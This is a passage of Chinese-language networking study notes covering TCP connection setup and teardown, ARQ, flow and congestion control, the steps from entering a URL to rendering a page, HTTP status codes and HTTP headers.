<h3 id="传了SYN，为什么还要传ACK"><a href="#传了SYN，为什么还要传ACK" class="headerlink" title="传了SYN，为什么还要传ACK"></a>传了SYN，为什么还要传ACK</h3><p>双方通信无误必须是两者互相发送消息都无误，传了<code>SYN</code>，证明发送方到接收方的通道没有问题，但是接收方到发送方的通道还需要<code>ACK</code>信号进行验证。</p>
<h3 id="三次握手失败怎么办？"><a href="#三次握手失败怎么办？" class="headerlink" title="三次握手失败怎么办？"></a>三次握手失败怎么办？</h3><p>tcp 建立连接三次握手，主动方发送请求 syn，server 接收到信息，返回带有数据包的信息 syn_sent，然后接收到信息的一方再发送确认信息 ACK 给 server，第三次握手失败（超时）时，服务器并不会重传 ack 报文，server 会发送 RTS 复位报文段并主动关闭至 closed，以防止 syn 洪泛攻击。</p>
<blockquote>
<p>syn洪泛攻击：通俗的理解是，当第三次握手没有发送确认信息时，等待一段时间后，主机就会断开之前的半开连接并回收资源，这为 dos（deny of service） 攻击埋下隐患，当主动方主动发送大量的 syn 数据包，但并不做出第三次握手响应，server 就会为这些 syn 包分配资源（但并未使用），就会使 server 占用大量内存，使 server 连接环境耗尽，这就是 syn 洪泛攻击</p>
</blockquote>
<h2 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h2><p>断开一个TCP连接需要“四次挥手”<br><img src="https://qiniu.xiaoming.net.cn/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.png" alt="四次挥手"></p>
<p><img src="https://qiniu.xiaoming.net.cn/%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B2.jpg" alt="四次挥手2"></p>
<ul>
<li>客户端：发送一个<code>FIN = 1</code>，用来关闭客户端到服务器的数据传送</li>
<li>服务器：收到这个<code>FIN</code>,它发送一个<code>ACK=1</code>，确认序号为收到的序号加1。和<code>SYN</code>一样，一个<code>FIN</code>将占用一个序号。此时<strong>TCP属于半关闭状态</strong>，服务端能向客户端发送数据，但是客户端不能向服务端发送数据。</li>
<li>服务器：关闭与客户端的连接，发送一个<code>FIN = 1，ACK =1</code>给客户端</li>
<li>客户端：发回<code>ACK = 1</code>报文确认，并将确认序号设置为收到序号加1</li>
<li>客户端：进入<code>TIME-WAIT</code>状态，等待<code>2MSL</code>（最大报文存活时间）后释放链接</li>
<li>服务端收到客户端的确认后释放链接。</li>
</ul>
<h3 id="为什么要四次挥手"><a href="#为什么要四次挥手" class="headerlink" title="为什么要四次挥手"></a>为什么要四次挥手</h3><p>客户端发送了<code>FIN</code>连接释放报文之后，服务器收到了这个报文后就进入<code>CLOSE-WAIT</code>状态，这是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送<code>FIN</code>连接释放报文。</p>
<p>客户端收到服务端的<code>FIN</code>报文后进入<code>TIME_WAIT</code>状态，此时并不是直接进入<code>CLOSED</code>状态，还需要等待一个时间计时器设置的时间<code>2MSL</code>，原因：</p>
<ul>
<li>确保最后一个确认报文能够到达。如果服务端没收到来自客户端的确认报文，那么就会重新发送连接释放请求报文，客户端等待一段时间就是为了处理这种情况发生</li>
<li>对于 TCP 来说，在将数据添加到发送缓冲区之后，可能需要等待相对较长的时间之后数据才会被真正发送出去，等待一段时间是为了让本连接持续时间内所产生的所有报文都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文。</li>
</ul>
<p>任何一方都可以在数据传送结束后发出连接释放的通知，待对方确认后进入半关闭状态。当另一方也没有数据再发送的时候，则发出连接释放通知，双方确认后就完全关闭了TCP连接。</p>
<h1 id="6-TCP，UDP协议的区别"><a href="#6-TCP，UDP协议的区别" class="headerlink" title="6. TCP，UDP协议的区别"></a>6. TCP，UDP协议的区别</h1><p>![TCP，UDP协议区别](<a href="https://qiniu.xiaoming.net.cn/TCP">https://qiniu.xiaoming.net.cn/TCP</a> UDP区别.webp)</p>
<p>UDP 在传送数据之前不需要先建立连接，远地主机在收到 UDP 报文后，不需要给出任何确认。虽然 UDP 不提供可靠交付，但在某些情况下 UDP 确是一种最有效的工作方式（一般用于即时通信），比如： QQ 语音、 QQ 视频 、直播等等</p>
<p>TCP 提供面向连接的服务。在传送数据之前必须先建立连接，数据传送结束后要释放连接。 TCP 不提供广播或多播服务。由于 TCP 要提供可靠的，面向连接的传输服务（TCP的可靠体现在TCP在传递数据之前，会有三次握手来建立连接，而且在数据传递时，有确认、窗口、重传、拥塞控制机制，在数据传完后，还会断开连接用来节约系统资源），这一难以避免增加了许多开销，如确认，流量控制，计时器以及连接管理等。这不仅使协议数据单元的首部增大很多，还要占用许多处理机资源。TCP 一般用于文件传输、发送和接收邮件、远程登录等场景。</p>
<h1 id="7-TCP协议如何保证可靠传输"><a href="#7-TCP协议如何保证可靠传输" class="headerlink" title="7. TCP协议如何保证可靠传输"></a>7. TCP协议如何保证可靠传输</h1><ul>
<li>应用数据被分割成 TCP 认为最适合发送的数据块。</li>
<li>TCP 给发送的每一个包进行编号，接收方对数据包进行排序，把有序数据传送给应用层。</li>
<li><strong>检验和</strong>：TCP 将保持它首部和数据的校验和。这是一个端到端的校验和，目的是检测数据在传输过程中的任何变化。如果收到段的校验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。</li>
<li>TCP 的接收端会丢弃重复的数据。</li>
<li><strong>流量控制</strong>：TCP 连接的每一方都有固定大小的缓冲空间，TCP的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的<strong>滑动窗口协议</strong>。 （TCP 利用滑动窗口实现流量控制）</li>
<li><strong>拥塞控制</strong>：当网络拥塞时，减少数据的发送</li>
<li><strong>ARQ协议</strong>：也是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组。</li>
<li><strong>超时重传</strong>：当 TCP 发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段。</li>
</ul>
<h2 id="ARQ协议"><a href="#ARQ协议" class="headerlink" title="ARQ协议"></a>ARQ协议</h2><p>自动重传请求（Automatic Repeat-reQuest）是OSI模型中数据链路层和传输层的错误纠正协议之一。它通过使用确认和超时这两个机制，在不可靠服务的基础上实现可靠的信息传输。如果发送方在发送后一段时间之内没有收到确认帧，它通常会重新发送。ARQ包括<strong>停止等待ARQ协议</strong>和<strong>连续ARQ协议</strong></p>
<h3 id="停止等待ARQ协议"><a href="#停止等待ARQ协议" class="headerlink" title="停止等待ARQ协议"></a>停止等待ARQ协议</h3><p>停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认（回复<code>ACK</code>），如果过了一段时间（超时时间），还是没有收到<code>ACK</code>确认，说明没有发送成功，需要重新发送，直到收到确认后再发下一个分组。</p>
<p>在停止等待协议中，若接收方收到重复分组，<strong>就丢弃该分组，但同时还要发送确认</strong></p>
<p><strong>优点</strong>：简单</p>
<p><strong>缺点</strong>：信道利用率低等待时间长</p>
<h4 id="无差错情况"><a href="#无差错情况" class="headerlink" title="无差错情况"></a>无差错情况</h4><p>发送方法送分组，接收方在规定时间内收到，并且回复确认，发送方再次发送。</p>
<h4 id="出现差错情况（超时重传）"><a href="#出现差错情况（超时重传）" class="headerlink" title="出现差错情况（超时重传）"></a>出现差错情况（超时重传）</h4><p>停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重传时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为<strong>自动重传请求 ARQ</strong>。另外在停止等待协议中若收到重复分组，就丢弃该分组，但同时还要发送确认。连续 ARQ 协议可提高信道利用率。发送维持一个发送窗口，凡位于发送窗口内的分组可连续发送出去，而不需要等待对方确认。接收方一般采用累积确认，对按序到达的最后一个分组发送确认，表明到这个分组位置的所有分组都已经正确收到了。</p>
<h4 id="确认丢失和确认迟到"><a href="#确认丢失和确认迟到" class="headerlink" title="确认丢失和确认迟到"></a>确认丢失和确认迟到</h4><ul>
<li><p>确认丢失</p>
<p>：确认消息在传输过程丢失。当A发送M1消息，B收到后，B向A发送了一个M1确认消息，但却在传输过程中丢失。而A并不知道，在超时计时过后，A重传M1消息，B再次收到该消息后采取以下两点措施：</p>
<ol>
<li>丢弃这个重复的M1消息，不向上层交付。</li>
<li>向A发送确认消息。（不会认为已经发送过了，就不再发送。A能重传，就证明B的确认消息丢失）。</li>
</ol>
</li>
<li><p>确认迟到</p>
<p>：确认消息在传输过程中迟到。A发送M1消息，B收到并发送确认。在超时时间内没有收到确认消息，A重传M1消息，B仍然收到并继续发送确认消息（B收到了2份M1）。此时A收到了B第二次发送的确认消息。接着发送其他数据。过了一会，A收到了B第一次发送的对M1的确认消息（A也收到了2份确认消息）。处理如下：</p>
<ol>
<li>A收到重复的确认后，直接丢弃。</li>
<li>B收到重复的M1后，也直接丢弃重复的M1。</li>
</ol>
</li>
</ul>
<h3 id="连续ARQ协议"><a href="#连续ARQ协议" class="headerlink" title="连续ARQ协议"></a>连续ARQ协议</h3><p>连续 ARQ 协议可提高信道利用率。发送方维持一个发送窗口，凡位于发送窗口内的分组可以连续发送出去，而不需要等待对方确认。接收方一般采用累计确认，对按序到达的最后一个分组发送确认，表明到这个分组为止的所有分组都已经正确收到了。</p>
<p><strong>优点</strong>： 信道利用率高，容易实现，即使确认丢失，也不必重传。</p>
<p><strong>缺点</strong>： 不能向发送方反映出接收方已经正确收到的所有分组的信息。比如：发送方发送了 5 条消息，中间第三条丢失（3号），这时接收方只能对前两个发送确认。发送方无法知道后三个分组的下落，而只好把后三个全部重传一次。这也叫 <code>Go-Back-N</code>（回退 N），表示需要退回来重传已经发送过的 N 个消息。</p>
<h2 id="滑动窗口和流量控制"><a href="#滑动窗口和流量控制" class="headerlink" title="滑动窗口和流量控制"></a>滑动窗口和流量控制</h2><p>窗口是缓存的一部分，用来暂时存放字节流。<strong>发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小</strong>。</p>
<p>发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。</p>
<p>接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {34, 35} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。</p>
<p><img src="https://qiniu.xiaoming.net.cn/TCP%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3.jpg" alt="TCP滑动窗口"></p>
<p>TCP 利用滑动窗口实现流量控制。流量控制是为了控制发送方发送速率，保证接收方来得及接收。 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。</p>
<h2 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h2><p>在某段时间，若对网络中某一资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏。这种情况就叫拥塞。拥塞控制就是为了防止过多的数据注入到网络中，这样就可以使网络中的路由器或链路不致过载。拥塞控制所要做的都有一个前提，就是网络能够承受现有的网络负荷。拥塞控制是一个全局性的过程，涉及到所有的主机，所有的路由器，以及与降低网络传输性能有关的所有因素。相反，流量控制往往是点对点通信量的控制，是个端到端的问题。流量控制所要做到的就是抑制发送端发送数据的速率，以便使接收端来得及接收。</p>
<p>为了进行拥塞控制，TCP 发送方要维持一个<strong>拥塞窗口</strong>(cwnd)的状态变量。拥塞控制窗口的大小取决于网络的拥塞程度，并且动态变化。发送方让自己的发送窗口取为<strong>拥塞窗口和接收方的接受窗口中较小的一个</strong>。</p>
<p>TCP的拥塞控制采用了四种算法，即<strong>慢开始 、 拥塞避免 、快重传和快恢复</strong>。在网络层也可以使路由器采用适当的分组丢弃策略（如主动队列管理 AQM），以减少网络拥塞的发生。</p>
<h3 id="慢开始"><a href="#慢开始" class="headerlink" title="慢开始"></a>慢开始</h3><p>慢开始算法的思路是当主机开始发送数据时，如果立即把大量数据字节注入到网络，那么可能会引起网络阻塞，因为现在还不知道网络的符合情况。经验表明，较好的方法是先探测一下，即由小到大逐渐增大发送窗口，也就是由小到大逐渐增大拥塞窗口数值。在旧的规定中是这样的，先把初始拥塞窗口 cwnd 设置为 1 至 2 个发送方的最大报文段 SMSS 的数值，但新的 RFC 5681 把初始拥塞窗口 cwdn 设置为不超过 2 至 4 个 SMSS 的数值，每经过一个传播轮次，cwnd加倍（2，4，8…）。为了防止拥塞窗口 cwnd 增长过大引起网络拥塞，还需要设置一个<strong>慢开始门限 ssthresh 状态变量</strong>。慢开始门限 ssthresh 的用法如下：</p>
<ol>
<li>当 cwnd &lt; ssthresh 时，使用上述慢开始算法</li>
<li>当 cwnd &gt; ssthresh 时，停止使用慢开始算法而改用拥塞避免算法</li>
<li>当 cwnd = ssthresh 时，既可以使用慢开始算法，也可以使用拥塞避免算法</li>
</ol>
<h3 id="拥塞避免"><a href="#拥塞避免" class="headerlink" title="拥塞避免"></a>拥塞避免</h3><p>拥塞避免算法的思路是让拥塞窗口cwnd缓慢增大，即每经过一个往返时间RTT就把发送方的cwnd加1。按线性规律缓慢增长，比慢开始算法的拥塞窗口增长速率缓慢得多。</p>
<p>需要注意，拥塞避免并非完全能够避免拥塞，而是说把拥塞窗口控制为按线性规律增长，使网络比较不容易出现拥塞。</p>
<h3 id="快重传与快恢复"><a href="#快重传与快恢复" class="headerlink" title="快重传与快恢复"></a>快重传与快恢复</h3><p>在接收方，要求每次接收到报文段都应该对最后一个已收到的有序报文段进行确认。例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。</p>
<p>有时，个别报文段会在网络中丢失，但实际上网络并未发生拥塞。如果发送方迟迟收不到确认，就会产生超时，就会误认为网络发生了拥塞。这就导致发送方错误地启动慢开始，把拥塞窗口 cwnd 又设置为 1，因而降低了传输效率。采用快重传算法可以让发送方尽早知道发生了个别报文段的丢失。</p>
<p>在发送方，如果收到三个重复确认，那么可以知道下一个报文段丢失，此时执行快重传，立即重传下一个报文段。例如收到三个 M2，则 M3 丢失，立即重传 M3。</p>
<p>在这种情况下，只是丢失个别报文段，而不是网络拥塞。因此执行快恢复，令<code>ssthresh = cwnd / 2 ，cwnd = ssthresh</code>，注意到此时直接进入拥塞避免。</p>
<p>慢开始和快恢复的快慢指的是<code>cwnd</code>的设定值，而不是<code>cwnd</code>的增长速率。慢开始<code>cwnd</code>设定为 1，而快恢复<code>cwnd</code>设定为<code>ssthresh</code>。<br>在 TCP/IP 中，快速重传和恢复（fast retransmit and recovery，<code>FRR</code>）是一种拥塞控制算法，它能快速恢复丢失的数据包。没有<code>FRR</code>，如果数据包丢失了，TCP 将会使用定时器来要求传输暂停。在暂停的这段时间内，没有新的或复制的数据包被发送。有了<code>FRR</code>，如果接收机接收到一个不按顺序的数据段，它会立即给发送机发送一个重复确认。如果发送机接收到三个重复确认，它会假定确认件指出的数据段丢失了，并立即重传这些丢失的数据段。有了<code>FRR</code>，就不会因为重传时要求的暂停被耽误。当有单独的数据包丢失时，快速重传和恢复（<code>FRR</code>）能最有效地工作。当有多个数据信息包在某一段很短的时间内丢失时，它则不能很有效地工作。</p>
<p>整体的情况如下：</p>
<p><img src="https://qiniu.xiaoming.net.cn/%E6%85%A2%E5%BC%80%E5%A7%8B%E4%B8%8E%E6%8B%A5%E5%A1%9E%E9%81%BF%E5%85%8D%E7%AE%97%E6%B3%95.jpg" alt="慢开始与拥塞避免算法"></p>
<h1 id="8-在浏览器中输入url地址到显示主页这个过程发生了什么"><a href="#8-在浏览器中输入url地址到显示主页这个过程发生了什么" class="headerlink" title="8. 在浏览器中输入url地址到显示主页这个过程发生了什么"></a>8. 在浏览器中输入url地址到显示主页这个过程发生了什么</h1><p>总体来说分为以下几个过程：</p>
<ol>
<li>DHCP配置主机信息</li>
<li>ARP解析MAC地址</li>
<li>DNS解析</li>
<li>TCP连接</li>
<li>发送HTTP请求</li>
<li>服务器处理请求并返回HTTP报文</li>
<li>浏览器解析渲染页面</li>
<li>连接结束</li>
</ol>
<h2 id="DHCP配置主机信息"><a href="#DHCP配置主机信息" class="headerlink" title="DHCP配置主机信息"></a>DHCP配置主机信息</h2><p>假设主机最开始没有IP地址以及其他信息，那么它就需要先使用DHCP（动态主机配置协议）来获取。主机生成一个DHCP请求报文，并将这个报文放入具有目的端口67和源端口68的UDP报文段中。该报文段被放置在一个具有广播IP目的地址（255.255.255.255)和源IP地址（0.0.0.0）的IP数据报中。该数据报又被放置在MAC帧中，该帧具有目的地址FF:FF:FF:FF:FF:FF,将广播到与交换机连接的所有设备。连接在交换机的 DHCP 服务器收到广播帧之后，不断地向上分解得到 IP 数据报、UDP 报文段、DHCP 请求报文，之后生成 DHCP ACK 报文，该报文包含以下信息：IP 地址、DNS 服务器的 IP 地址、默认网关路由器的 IP 地址和子网掩码。该报文被放入 UDP 报文段中，UDP 报文段又被放入 IP 数据报中，最后放入 MAC 帧中。该帧的目的地址是请求主机的 MAC 地址，因为交换机具有自学习能力，之前主机发送了广播帧之后就记录了 MAC 地址到其转发接口的交换表项，因此现在交换机就可以直接知道应该向哪个接口发送该帧。主机收到该帧后，不断分解得到 DHCP 报文。之后就配置它的 IP 地址、子网掩码和 DNS 服务器的 IP 地址，并在其 IP 转发表中安装默认网关。</p>
<h2 id="ARP解析MAC地址"><a href="#ARP解析MAC地址" class="headerlink" title="ARP解析MAC地址"></a>ARP解析MAC地址</h2><p>主机通过浏览器生成一个TCP套接字，套接字向HTTP服务器发送HTTP请求，为了生成该套接字，主机需要知道网站的域名对应的IP地址。主机生成一个 DNS查询报文，该报文具有 53 号端口，因为 DNS 服务器的端口号是 53。该 DNS 查询报文被放入目的地址为 DNS 服务器 IP 地址的 IP 数据报中。该 IP 数据报被放入一个以太网帧中，该帧将发送到网关路由器。<strong>DHCP 过程只知道网关路由器的 IP 地址，为了获取网关路由器的 MAC 地址，需要使用 ARP 协议</strong>。主机生成一个包含目的地址为网关路由器 IP 地址的 ARP 查询报文，将该 ARP 查询报文放入一个具有广播目的地址（FF:FF:FF:FF:FF:FF）的以太网帧中，并向交换机发送该以太网帧，交换机将该帧转发给所有的连接设备，包括网关路由器。网关路由器接收到该帧后，不断向上分解得到 ARP 报文，发现其中的 IP 地址与其接口的 IP 地址匹配，因此就发送一个 ARP 回答报文，包含了它的 MAC 地址，发回给主机。</p>
<h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><p>DNS是一个分布式数据库，提供了主机名和 IP 地址之间相互转换的服务。这里的分布式数据库是指，每个站点只保留它自己的那部分数据。</p>
<p>域名具有层次结构，从上到下依次为：根域名、顶级域名、二级域名。</p>
<p><img src="https://qiniu.xiaoming.net.cn/DNS.jpg" alt="DNS"></p>
<p>DNS 可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53。大多数情况下 DNS 使用 UDP 进行传输，这就要求域名解析器和域名服务器都必须自己处理超时和重传从而保证可靠性。在两种情况下会使用 TCP 进行传输：</p>
<ul>
<li>如果返回的响应超过的 512 字节（UDP 最大只支持 512 字节的数据）。</li>
<li>区域传送（区域传送是主域名服务器向辅助域名服务器传送变化的那部分数据）。</li>
</ul>
<p>DNS解析是一个递归查询ip地址的过程。</p>
<p><img src="http://qiniu.xiaoming.net.cn/IP%E5%9C%B0%E5%9D%80%E6%9F%A5%E8%AF%A2%E8%BF%87%E7%A8%8B.png" alt="ip地址查询过程"></p>
<p>首先在本地域名服务器中查询ip地址，如果没有找到，本地域名服务器会向根域名服务器发送一个请求，如果根域名服务器也不存在该域名时，本地域名会向<code>com</code>顶级域名服务器发送一个请求，如果还没有，则继续直到最后本地域名服务器得到域名的ip地址并把它缓存到本地，供下次查询时使用。</p>
<p>可以看出，域名的解析是一个从右到左的过程：<code>com-&gt;google.com-&gt;www.google.com</code>。在实际上，真正的域名是<code>www.google.com.</code>，这里的<code>.</code>是对应的根域名服务器，默认情况下所有的网址都有最后一个<code>.</code>，既然是默认情况下，为了方便用户，通常都会省略，浏览器在请求DNS的时候会自动加上，所有网址真正的解析过程为: <code>. -&gt; .com -&gt; google.com. -&gt; www.google.com.</code>。</p>
<p>DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种：浏览器缓存、系统缓存、路由器缓存、IPS服务器缓存、根域名服务器缓存、顶级域名服务器缓存、主域名服务器缓存。</p>
<h2 id="TCP连接和HTTP请求"><a href="#TCP连接和HTTP请求" class="headerlink" title="TCP连接和HTTP请求"></a>TCP连接和HTTP请求</h2><p>浏览器向Web服务器发送一个HTTP请求，HTTP协议是使用 TCP 协议作为其传输层协议的，当TCP出现瓶颈时，HTTP也会受到影响。</p>
<p>HTTP报文是包裹在TCP报文中发送的，服务器端收到TCP报文时会解包提取出HTTP报文。但是这个过程中存在一定的风险，HTTP报文是明文，如果中间被截取的话会存在一些信息泄露的风险。那么在进入TCP报文之前对HTTP做一次加密就可以解决这个问题了。HTTPS协议的本质就是<code>HTTP + SSL(or TLS)</code>。在HTTP报文进入TCP报文之前，先使用SSL对HTTP报文进行加密。从网络的层级结构看它位于HTTP协议与TCP协议之间。</p>
<p>HTTPS在传输数据之前需要客户端与服务器进行一个握手(TLS/SSL握手)，在握手过程中将确立双方加密传输数据的密码信息。TLS/SSL使用了非对称加密，对称加密以及hash等。HTTPS相比于HTTP，虽然提供了安全保证，但是势必会带来一些时间上的损耗，如握手和加密等过程，是否使用HTTPS需要根据具体情况在安全和性能方面做出权衡。</p>
<p>发送HTTP请求的过程就是构建HTTP请求报文并通过TCP协议中发送到服务器指定端口(HTTP协议80/8080, HTTPS协议443)。HTTP请求报文是由三部分组成:请求行,请求报头和请求正文。</p>
<h2 id="服务端处理并返回HTTP报文"><a href="#服务端处理并返回HTTP报文" class="headerlink" title="服务端处理并返回HTTP报文"></a>服务端处理并返回HTTP报文</h2><p>后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的<code>socket</code>。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成<code>HTTP Request</code>对象，供上层使用。这一部分工作一般是由Web服务器去进行。</p>
<p>HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。</p>
<h2 id="浏览器解析渲染页面"><a href="#浏览器解析渲染页面" class="headerlink" title="浏览器解析渲染页面"></a>浏览器解析渲染页面</h2><p>对HTML，CSS进行渲染，JS解析由浏览器中的JS解析引擎完成。</p>
<h2 id="用到的协议"><a href="#用到的协议" class="headerlink" title="用到的协议"></a>用到的协议</h2><ul>
<li><strong>DHCP协议</strong>：动态主机配置协议，提供了即插即用的连网方式，用户不再需要手动配置 IP 地址等信息。</li>
<li><strong>DNS协议</strong>：获取域名对应IP</li>
<li><strong>TCP协议</strong>：与服务器建立TCP连接</li>
<li><strong>HTTP协议</strong>：在TCP建立后，使用HTTP协议访问网页</li>
<li><strong>OPSF协议</strong>：IP数据包在路由器之间，路由选择使用OPSF协议</li>
<li><strong>ARP协议</strong>：路由器在与服务器通信时，需要将ip地址转化为MAC地址，需要使用ARP协议</li>
<li><strong>PPP协议和CSMA/CD协议</strong>：数据链路层的点对点信道和广播信道使用的协议</li>
</ul>
<h1 id="9-状态码"><a href="#9-状态码" class="headerlink" title="9. 状态码"></a>9. 状态码</h1><p><img src="https://qiniu.xiaoming.net.cn/%E7%8A%B6%E6%80%81%E7%A0%81.png" alt="状态码"></p>
<h2 id="1XX-信息"><a href="#1XX-信息" class="headerlink" title="1XX 信息"></a>1XX 信息</h2><ul>
<li><strong>100 Continue</strong>：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应</li>
</ul>
<h2 id="2XX-成功"><a href="#2XX-成功" class="headerlink" title="2XX 成功"></a>2XX 成功</h2><ul>
<li><strong>200 OK</strong></li>
<li><strong>204 No Content</strong>：请求已经成功处理，但是返回的响应报文不包含实体的主体部分，一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用</li>
<li><strong>206 Partial Content</strong>：表示客户端进行了范围请求，响应报文包含由<code>Content-Range</code>指定的范围的实体内容</li>
</ul>
<h2 id="3XX-重定向"><a href="#3XX-重定向" class="headerlink" title="3XX 重定向"></a>3XX 重定向</h2><ul>
<li><p><strong>301 Moved Permanently</strong>：永久重定向</p>
</li>
<li><p><strong>302 Found</strong>：临时重定向</p>
</li>
<li><p>303 See Other</p>
<p>：与302有着相同的功能，但是303明确要求客户端应该采用GET方法获取资源。</p>
<blockquote>
<p>注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。</p>
</blockquote>
</li>
<li><p><strong>304 Not Modified</strong>：如果请求报文首部包含一些条件：<code>If-Match</code>,<code>If-Modified-Since</code>，<code>If-None-Match</code>,<code>If-Range</code>,<code>If-Unmodified-Since</code>，如果不满足条件，则服务器回返回 304 状态码</p>
</li>
<li><p><strong>307 Temporary Redirect</strong>：临时重定向，与302的含义类似，但是307要求浏览器不会把重定向请求的POST方法改为GET方法</p>
</li>
</ul>
<h2 id="4XX-客户端错误"><a href="#4XX-客户端错误" class="headerlink" title="4XX 客户端错误"></a>4XX 客户端错误</h2><ul>
<li><strong>400 Bad Request</strong>：请求报文中存在语法错误</li>
<li><strong>401 Unauthorized</strong>：该状态码表示发送的请求需要有认证信息（BASIC 认证，DIGEST 认证）。如果前面已进行过一次，则表示用户认证失败。</li>
<li><strong>403 Forbidden</strong>：请求被拒绝</li>
<li><strong>404 Not Found</strong></li>
</ul>
<h2 id="5XX-服务器错误"><a href="#5XX-服务器错误" class="headerlink" title="5XX 服务器错误"></a>5XX 服务器错误</h2><ul>
<li><strong>500 Internal Server Error</strong>：服务器正在执行请求时发生错误</li>
<li><strong>502 Bad Gateway</strong>：网关错误，往往是由于 CPU 使用过满、数据库连接数过大、内存不足、甚至是内存溢出等等因素诱发导致</li>
<li><strong>503 Service Unavailable</strong>：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求</li>
</ul>
<h1 id="10-HTTP-协议"><a href="#10-HTTP-协议" class="headerlink" title="10. HTTP 协议"></a>10. HTTP 协议</h1><p>HTTP 协议是超文本传输协议的缩写，英文是 Hyper Text Transfer Protocol。它是从 WEB 服务器传输超文本标记语言(HTML)到本地浏览器的传送协议。</p>
<p>设计 HTTP 最初的目的是为了提供一种发布和接收 HTML 页面的方法。</p>
<p>HTTP 有多个版本，目前广泛使用的是HTTP/1.1版本。</p>
<p>HTTP 是一个基于 TCP/IP 通信协议来传递数据的协议，传输的数据类型为HTML 文件、图片文件, 查询结果等。</p>
<p>HTTP协议一般用于 B/S 架构。浏览器作为 HTTP 客户端通过 URL 向 HTTP 服务端即 WEB 服务器发送所有请求。</p>
<p><strong>HTTP 的特点</strong>：</p>
<ul>
<li>http 协议支持客户端/服务端模式，也是一种请求/响应模式的协议。</li>
<li>简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。</li>
<li>灵活：HTTP 允许传输多种类型的数据对象。传输的类型由 <code>Content-Type</code> 加以标记。</li>
<li>无连接：限制每次连接只处理一个请求。服务器处理完请求，并收到客户的应答后，即断开连接，但是却不利于客户端与服务器保持会话连接，为了弥补这种不足，产生了两项记录 http 状态的技术，一个叫做 Cookie,一个叫做 Session。</li>
<li>无状态：无状态是指协议对于事务处理没有记忆，后续处理需要前面的信息，则必须重传。</li>
</ul>
<h2 id="HTTP-报文组成"><a href="#HTTP-报文组成" class="headerlink" title="HTTP 报文组成"></a>HTTP 报文组成</h2><p>HTTP 报文分为请求报文和响应报文。</p>
<p>请求报文构成：</p>
<ul>
<li>请求行：包括请求方法、URL、协议/版本</li>
<li>请求头(Request Header)</li>
<li>请求正文</li>
</ul>
<p><img src="http://qiniu.xiaoming.net.cn/HTTP%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87.png" alt="HTTP请求报文"></p>
<p><img src="http://qiniu.xiaoming.net.cn/HTTP%E8%AF%B7%E6%B1%82%E7%BB%93%E6%9E%84.webp" alt="HTTP请求结构"></p>
<p>响应报文构成：</p>
<ul>
<li>状态行</li>
<li>响应头</li>
<li>响应正文</li>
</ul>
<p><img src="http://qiniu.xiaoming.net.cn/HTTP%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87.png" alt="HTTP响应报文"></p>
<h2 id="HTTP-首部"><a href="#HTTP-首部" class="headerlink" title="HTTP 首部"></a>HTTP 首部</h2><p>有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。</p>
<p>各种首部字段及其含义如下（不需要全记，仅供查阅）：</p>
<h3 id="通用首部字段"><a href="#通用首部字段" class="headerlink" title="通用首部字段"></a>通用首部字段</h3><table>
<thead>
<tr>
<th align="left">首部字段名</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Cache-Control</td>
<td align="left">控制缓存的行为</td>
</tr>
<tr>
<td align="left">Connection</td>
<td align="left">控制不再转发给代理的首部字段、管理持久连接</td>
</tr>
<tr>
<td align="left">Date</td>
<td align="left">创建报文的日期时间</td>
</tr>
<tr>
<td align="left">Pragma</td>
<td align="left">报文指令</td>
</tr>
<tr>
<td align="left">Trailer</td>
<td align="left">报文末端的首部一览</td>
</tr>
<tr>
<td align="left">Transfer-Encoding</td>
<td align="left">指定报文主体的传输编码方式</td>
</tr>
<tr>
